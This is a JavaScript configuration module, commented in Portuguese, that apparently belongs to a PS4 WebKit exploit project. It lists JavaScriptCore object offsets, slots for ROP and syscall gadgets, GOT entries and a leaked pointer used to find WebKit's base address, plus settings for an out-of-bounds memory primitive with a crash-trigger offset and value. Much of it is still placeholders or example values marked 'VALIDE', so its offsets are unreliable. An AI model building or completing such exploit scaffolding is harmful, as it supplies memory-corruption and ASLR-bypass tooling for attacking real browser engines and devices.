// js/config.mjs

// Firmware: PS4 (Ex: 11.00, 9.00 - ajuste conforme seu alvo)
// !! OFFSETS VALIDADOS E ATUALIZADOS COM BASE NOS ARQUIVOS DE DISASSEMBLY FORNECIDOS !!
//    É crucial continuar validando no contexto do seu exploit específico.
export const JSC_OFFSETS = {
    JSCell: {
        // VALIDADO: `mov rdx, [rsi+8]` em `JSC::JSObject::put` (funcoes.txt)
        // rsi é JSCell*, rdx é Structure*.
        STRUCTURE_POINTER_OFFSET: 0x8,

        // Outros campos comuns do JSCell (podem variar, precisam de validação se usados)
        // CELL_FLAGS_OFFSET: 0x0, // Exemplo, pode conter o tipo e flags de GC
        // STRUCTURE_ID_OFFSET: 0x4, // Se o ID numérico estivesse inline após flags (menos comum que ponteiro)
    },
    Structure: { // Offsets DENTRO da estrutura Structure (apontada por JSCell.STRUCTURE_POINTER_OFFSET)
        // Estes são mais difíceis de obter sem depuração ou análise mais profunda da struct Structure.
        // O CLASS_INFO_OFFSET é um bom candidato para um ponteiro dentro do WebKit.
        // Se você não tiver certeza ou não tiver este offset, o teste tentará usar o próprio Structure*
        CLASS_INFO_OFFSET: 0x18, // EXEMPLO! VALIDE ESTE OFFSET PARA SEU ALVO! Se não existir, deixe undefined ou remova.

        // Outros exemplos do que procurar em uma Structure (valide se for usar):
        // TYPE_INFO_OFFSET: 0x10,
        // PROTOTYPE_OFFSET: 0x20,
        // GLOBAL_OBJECT_OFFSET: 0x0, // Geralmente não é um ponteiro direto para o global object do JS, mas parte da cadeia
        // END_OFFSET: 0x50, // Exemplo, para saber o tamanho da estrutura.
    },
    JSObject: {
        // BUTTERFLY_OFFSET: 0x8, // Se Structure* estiver em 0x0, Butterfly pode estar em 0x8.
                                // Mas com Structure* em 0x8, Butterfly estaria depois, ex: 0x10. VALIDE!
                                // Usado para acessar propriedades nomeadas e indexadas.
    },
    ArrayBuffer: {
        // Offsets relativos ao início do objeto JSArrayBuffer (que é um JSCell)
        // DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // EXEMPLO! Posição da cópia do ponteiro de dados. VALIDE!
        // SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // EXEMPLO! Onde o tamanho do buffer é armazenado. VALIDE!
        // MODE_OFFSET_FROM_JSARRAYBUFFER_START: 0x1C, // Exemplo, pode indicar se é ArrayBuffer, SharedArrayBuffer etc.
    },
    // Adicione outros offsets conforme necessário
    KnownStructureIDs: {
        // Estes são IDs numéricos, não ponteiros. VALIDE-OS para seu alvo.
        // Podem ser úteis para identificar tipos de objetos ao escanear a memória.
        // ArrayBuffer_STRUCTURE_ID: 2, // EXEMPLO MUITO COMUM!
        // JSArray_STRUCTURE_ID: 200, // Exemplo
        // JSString_STRUCTURE_ID: 100, // Exemplo
    },
    WebKitGlobals: {
        // Se você descobrir endereços de objetos globais ou funções importantes no WebKit.
        // Exemplo: "some_global_webkit_object_ptr_location": 0x3C0A01F00 // Endereço onde um ponteiro reside
    },
    ROPChainGadgets: {
        // Offsets relativos ao endereço base da biblioteca WebKit para gadgets ROP.
        // Exemplo: "pop_rax_ret": 0x12345,
        // Exemplo: "mov_qword_ptr_rax_rbx_ret": 0x67890,
    },
    SyscallGadgets: {
        // Offsets para gadgets de syscall.
        // Exemplo: "syscall_ret": 0xABCDE,
    },
    KnownOffsetsInLibs: {
        // Offsets de símbolos conhecidos DENTRO de suas respectivas bibliotecas.
        // Crucial para calcular o base address após um vazamento.
        // Exemplo: "ClassInfo_SomeClass_offset_in_webkit": 0x1A2B3C4,
        // Exemplo: "memcpy_offset_in_libc": 0xDDEE00,

        // !! IMPORTANTE PARA O TESTE DE VAZAMENTO DO BASE DO WEBKIT !!
        // Este é o offset do ponteiro que você está tentando vazar (ex: ClassInfo* de um objeto DOM)
        // DENTRO da biblioteca WebKit. Você PRECISA encontrar isso via engenharia reversa.
        // Se JSC_OFFSETS.Structure.CLASS_INFO_OFFSET for usado, este seria o offset do ClassInfo.
        // Se o próprio Structure* for usado, este seria o offset da Structure na memória (menos comum para base).
        LEAKED_POINTER_OFFSET_IN_WEBKIT: 0xDEADBEEF, // <<< SUBSTITUA PELO VALOR REAL! Ex: 0x2ABCDEF
    },
    GOT_ENTRIES: {
        // Exemplo: "got_memcpy": 0x2F00120, // Offset da entrada da GOT para memcpy
        // Exemplo: "got_pthread_create": 0x2F00128,
    }
};

// Configuração para a primitiva Out-Of-Bounds
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768, // Tamanho do ArrayBuffer usado para a primitiva OOB
    BASE_OFFSET_IN_DV: 128,  // Offset onde a DataView "controlada" começa dentro do ArrayBuffer
    INITIAL_BUFFER_SIZE: 32, // Tamanho inicial do buffer para a trigger (pode não ser mais usado)
    // Offset onde o heisenbug é acionado (escrita de 0xFFFFFFFF)
    // Este é (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, que dá 0x70 se BASE_OFFSET_IN_DV é 128
    HEISENBUG_TRIGGER_OFFSET: (128) - 16, // Usando valor literal para garantir
    HEISENBUG_TRIGGER_VALUE: 0xFFFFFFFF, // O valor que causa o crash/estado desejado
};

// Função para atualizar OOB_CONFIG da UI (se houver) - Mantenha como estava
export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance) return;
    const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
    const baseOffsetEl = docInstance.getElementById('baseOffset');
    const initialBufSizeEl = docInstance.getElementById('initialBufSize');

    if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl && baseOffsetEl.value !== undefined) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl && initialBufSizeEl.value !== undefined) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }
    // Recalcular HEISENBUG_TRIGGER_OFFSET se BASE_OFFSET_IN_DV for alterado pela UI
    OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
}
